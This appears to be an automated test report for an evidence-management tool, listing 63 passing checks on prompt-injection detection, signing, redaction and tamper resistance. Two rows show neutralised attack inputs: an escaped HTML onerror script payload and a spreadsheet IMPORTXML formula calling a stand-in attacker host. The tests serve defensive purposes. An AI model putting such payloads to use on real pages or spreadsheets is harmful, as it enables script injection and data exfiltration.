# SourceStack Evidence Gauntlet Report

Generated: 2026-06-17T00:13:10.790Z
Overall: PASS
Cases: 63
Failures: 0

## Category Counts

- graph_logic: 2
- live_mode: 2
- model_safety: 10
- ocr_anchoring: 6
- packet_integrity: 9
- privacy_redaction: 7
- source_integrity: 27

| Case | Category | Result | Detail |
| --- | --- | --- | --- |
| prompt_injection_document | model_safety | PASS | 5 injection finding(s) detected |
| prompt_injection_auto_suggest_quarantine | model_safety | PASS | Security review: 2 possible source-borne instructions detected. Source text is evidence, never instruction. Automatic evidence suggestions were skipped for this record. |
| obfuscated_prompt_injection | model_safety | PASS | 2 finding(s) after leetspeak/homoglyph normalization |
| poisoned_email_thread | model_safety | PASS | 4 injection finding(s) in a multi-message email thread |
| adversarial_transcript_speaker | model_safety | PASS | 2 injection finding(s) in a meeting transcript line |
| unverified_export_attempt | packet_integrity | PASS | cited card blocked |
| duplicate_card_packet_attempt | packet_integrity | PASS | packet hard wall: selected card is duplicated |
| hash_manifest_verification | packet_integrity | PASS | manifest verified against source graph; page drift page hashes mismatch |
| cryptographic_manifest_signature | packet_integrity | PASS | signature verified for sha256:e6130bdc736410b5312d61389f14f51b9cfb5608fd4444bd23222cab7503d363; malformed/timestamp attacks blocked |
| packet_signer_trust_registry | packet_integrity | PASS | trusted signer accepted (13B4 EF7E 0024...); unknown signer pinned out |
| encrypted_signing_key_custody | packet_integrity | PASS | wrapped custody verified for sha256:4be10d1b0ded574bdbc6b3883c6cd79aa9e1827509b6106218aa6562a0359ba1; custody hash signed and tamper blocked |
| kdf_iteration_bounds | privacy_redaction | PASS | floor enforced, ceiling enforced |
| encrypted_signing_key_recoverable | packet_integrity | PASS | custody confirms key is recoverable; wrong passphrase rejected |
| legacy_bridge_no_self_anchor | source_integrity | PASS | fabricated legacy quote downgraded and blocked |
| stale_anchor_packet_attempt | ocr_anchoring | PASS | anchor_stale card blocked |
| card_anchor_reference_integrity | source_integrity | PASS | packet hard wall: card page and span page disagree |
| stale_char_range_anchor | ocr_anchoring | PASS | packet hard wall: source span text is not backed by page text or media/geometry anchor |
| unbacked_span_packet_attempt | source_integrity | PASS | span without page text or geometry was blocked |
| verification_workbench_unbacked_diagnostic | source_integrity | PASS | packet hard wall: source span text is not backed by page text or media/geometry anchor |
| verification_dossier_inspection_target | source_integrity | PASS | doc_a/page_a_1/span_a_1 |
| workbench_signoff_fail_closed_and_stale | source_integrity | PASS | stale-anchor signoff blocked; invalid/tampered signoff blocked; verified signoff is stale-detectable after a source change |
| workbench_promotion_certificate_binds_inspection | source_integrity | PASS | promotion certificate verified, ledger accepted it, blocked inspection tamper, and went stale after page proof drift |
| workbench_reanchor_binds_backing_text | source_integrity | PASS | backing text drift stales signoff; reanchor recovers to cited; disputed evidence cannot be reanchored |
| signoff_audit_stale_sweep | source_integrity | PASS | audit reports 0 stale when fresh, 1 stale after a source change |
| workbench_split_narrows_within_source | source_integrity | PASS | split rejects out-of-source sub-quotes; children stay source-backed and revert to cited |
| workbench_merge_same_source_only | source_integrity | PASS | merge refuses cross-source consolidation; same-source merge stays source-backed and reverts to cited |
| signoff_review_queue_latest_per_card | source_integrity | PASS | review queue keeps the latest signoff per card and flags it stale after a source change |
| forensic_bundle_signoff_provenance | source_integrity | PASS | fresh reviewer signoff and promotion provenance verify; stale source proof blocks bundle verification |
| workbench_edit_quote_stays_in_source | source_integrity | PASS | quote edit rejects text not in the source span; valid edit stays source-backed and reverts to cited |
| ocr_drift_reanchor | ocr_anchoring | PASS | reanchored with token_window_match at score 0.73 |
| fake_citation_chain | model_safety | PASS | card span does not exist |
| model_candidate_reference_integrity | model_safety | PASS | card page and span page disagree; model confidence must be between 0 and 1; model output duplicate candidate id; model output duplicate candidate id; model candidates cannot be accepted for verified-only packet destinations |
| duplicate_records | source_integrity | PASS | 1 duplicate content hash bucket(s) found |
| bitemporal_contradiction_detection | graph_logic | PASS | 1 source-span-classified contradiction(s) detected |
| claim_issue_theory_source_chain_gate | graph_logic | PASS | packet-ready claim repeats supporting card card_verified; ready issue theory strongest path failed: packet hard wall: card is cited, not verified; ready issue theory references suggested claim claim_suggested_ready; ready issue theory support failed: packet hard wall: card is cited, not verified; ready issue theory repeats claim claim_duplicate_support; ready issue theory repeats strongest-path card card_verified; ready issue theory strongest path references missing card card_missing |
| sourcestack_forensic_bundle_tamper | source_integrity | PASS | bundle verified sha256:726ddc503241d323f22ef88e099eb86cf05e4c2f0c5955f18e93f7327553adf0; 1 invariant failure(s); 1 packet manifest(s); signed embedded manifest verified |
| forensic_bundle_includes_artifact_and_ledger | source_integrity | PASS | 1 artifact(s), 3 trust event(s), 1 case artifact(s), 1 packet manifest(s), signed ledger head present, forged verification blocked, detached graph blocked, missing artifact blocked |
| source_artifact_case_store_custody | source_integrity | PASS | case artifact artifact:sha256:c37117c86a5bb78f32d2e2dc2dacc2c94443751cb0ff187a1835269b6fbdf28c verified, alias blocked: artifact store key mismatch/artifact id content hash mismatch, tamper blocked: artifact byte length mismatch |
| durable_artifact_payload_tamper | source_integrity | PASS | artifact byte length mismatch |
| append_only_quarantine_verification_audit | source_integrity | PASS | event previous hash mismatch; duplicate case event id; import quarantine event did not disable auto-suggest; evidence signoff event missing or invalid proof hash; evidence split event missing matching sub-quotes; event timestamp moved backwards |
| signed_ledger_head_forgery | source_integrity | PASS | clean ledger signed; re-chained forgery rejected (case ledger head hash mismatch) |
| durable_source_artifact_geometry | source_integrity | PASS | block quad outside page bounds; source artifact id mismatch; artifact page id mismatch; duplicate artifact page id; duplicate artifact page index; duplicate artifact block id; full-text collision blocked |
| geometry_within_bounds_tamper | ocr_anchoring | PASS | page geometry hash mismatch |
| geometry_only_backing_requires_media | source_integrity | PASS | floating quad blocked; sha256 page-image backing allowed |
| source_vault_original_and_page_media_custody | source_integrity | PASS | 1 page image(s); source vault record missing from store; source vault stored record metadata mismatch; source vault blob content hash mismatch; source vault blob record id mismatch; page image record id mismatch; duplicate source vault record id; duplicate rendered page image id |
| encrypted_source_vault_at_rest | privacy_redaction | PASS | payload sealed at rest; storage verified; wrong passphrase blocked |
| source_vault_local_state_redacts_payloads | privacy_redaction | PASS | payloads stripped; custody hash retained; verifier fails closed: source vault blob byte length mismatch |
| ocr_vault_job_gate | ocr_anchoring | PASS | 1 job(s); wrong media blocked; bad geometry blocked; duplicate block blocked; reserved block blocked; hostile OCR quarantined_prompt_injection |
| legacy_bridge_preserves_artifact_hash | source_integrity | PASS | bridge used sha256:cc5acce5b37bec2ab5e362e860a4bde81848fbca4c07b74d476df7c22e8fb245 |
| redaction_leak_scan | privacy_redaction | PASS | 5 token(s), 0 residual leak(s) |
| redaction_extended_pii_classes | privacy_redaction | PASS | 3 token(s) across 3 PII categories (street/card/name) |
| redaction_hard_wall_manual_drift | privacy_redaction | PASS | manual:Jane Doe |
| redacted_packet_source_artifact_dump | privacy_redaction | PASS | 3 source leak(s) blocked |
| malformed_model_output | model_safety | PASS | model output missing source references required by job contract |
| packet_html_escape | packet_integrity | PASS | &lt;img src=x onerror=&quot;alert(1)&quot;&gt; |
| csv_formula_neutralization | packet_integrity | PASS | "'=IMPORTXML(""https://attacker.test"",""//x"")" |
| local_only_frontier_block | model_safety | PASS | privacy mode local_only blocks frontier lane and no permitted local/deterministic lane is available |
| live_mode_verified_only | live_mode | PASS | 1 verified live suggestion(s) surfaced; malformed options 1; negative limit 0 |
| live_mode_current_signoff_required | live_mode | PASS | fresh 1; stale 0 |
| ledger_head_trusted_key_pin | source_integrity | PASS | ledger head accepted for a trusted signer, rejected for an untrusted one |
| artifact_span_honest_quad | ocr_anchoring | PASS | cross-block quote claims no quad; in-block quote keeps its quad |
| command_search_filters_bound_source_tree | source_integrity | PASS | command filters bound source candidates; tier middle |
| cli_intelligence_cannot_invent_candidates | model_safety | PASS | CLI intelligence can rank known candidates but rejects fabricated candidate IDs |

## Report Hashes

- Markdown body: sha256:31136b53d7cdfd42fed7402d78d9fe9fba2b20c58f53565372c1800c8b65bed9
- JSON report: sha256:0f71da449427c56bb0df40518cff8c96114eaab60130d763deac1772d72e3056
